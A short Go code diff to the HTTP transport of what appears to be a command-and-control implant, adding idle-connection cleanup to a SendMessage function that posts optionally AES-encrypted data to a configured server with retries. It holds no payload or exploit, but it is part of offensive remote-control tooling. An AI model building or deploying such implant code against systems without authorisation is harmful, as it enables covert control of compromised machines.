@@ -432,6 +432,10 @@ func (c *C2HTTP) IsRunning() bool {
 
 // htmlPostData HTTP POST function
 func (c *C2HTTP) SendMessage(sendData []byte) []byte {
+	defer func() {
+		// close all idle connections
+		client.CloseIdleConnections()
+	}()
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
 	//log.Println("Sending POST request to url: ", targeturl)
 	// If the AesPSK is set, encrypt the data we send
@@ -459,6 +463,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 	//byteBuffer := bytes.NewBuffer(sendDataBase64)
 	// bail out of trying to send data after 5 failed attempts
 	for i := 0; i < 5; i++ {
+
 		if c.ShouldStop {
 			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
 			return []byte{}
